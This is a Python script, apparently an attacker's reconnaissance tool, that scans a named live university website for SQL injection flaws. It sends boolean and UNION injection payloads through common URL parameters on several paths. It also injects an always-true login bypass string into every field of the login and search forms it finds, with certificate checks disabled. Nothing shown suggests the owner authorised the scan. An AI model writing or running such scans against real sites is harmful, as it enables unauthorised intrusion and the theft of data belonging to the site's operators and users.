#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"
session = requests.Session()
session.verify = False

print("[*] 主站SQL注入深度测试...")

# 测试参数
test_params = ["id", "page", "cat", "user", "search", "q", "keyword", "article"]

main_paths = [
    "/",
    "/index.php",
    "/portal/",
    "/banpot/",
    "/scmeeting/",
]

for path in main_paths:
    test_url = url + path
    print(f"\n[*] 测试: {test_url}")
    
    for param in test_params:
        # Boolean-based SQL注入
        payloads = [
            f"{param}=1' AND '1'='1",
            f"{param}=1' AND '1'='2",
            f"{param}=1' OR '1'='1",
            f"{param}=1' UNION SELECT NULL--",
            f"{param}=1' UNION SELECT 1,2,3--",
        ]
        
        for payload in payloads:
            full_url = f"{test_url}?{payload}"
            try:
                resp = requests.get(full_url, verify=False, timeout=5)
                
                # 检查错误信息
                if "mysql" in resp.text.lower() or "sql syntax" in resp.text.lower():
                    print(f"[+] SQL注入可能: {full_url}")
                    print(f"    错误信息: {resp.text[:200]}")
                
                # 检查响应差异
                normal_resp = requests.get(f"{test_url}?{param}=1", verify=False, timeout=5)
                if len(resp.text) != len(normal_resp.text) and abs(len(resp.text) - len(normal_resp.text)) > 100:
                    print(f"[*] 响应长度异常: {full_url}")
                    
            except:
                pass

print("\n[*] 检查POST参数SQL注入...")
# POST SQL注入测试
post_paths = [
    "/login.php",
    "/search.php",
    "/portal/login.php",
]

for post_path in post_paths:
    test_url = url + post_path
    resp = requests.get(test_url, verify=False, timeout=5)
    if resp.status_code == 200:
        print(f"[*] 发现POST表单: {test_url}")
        
        # 查找表单字段
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
        for inp in inputs:
            # 测试SQL注入
            data = {inp: "1' OR '1'='1"}
            resp2 = requests.post(test_url, data=data, verify=False, timeout=5)
            if "error" in resp2.text.lower() and "mysql" in resp2.text.lower():
                print(f"[+] POST SQL注入可能: {test_url} 参数: {inp}")
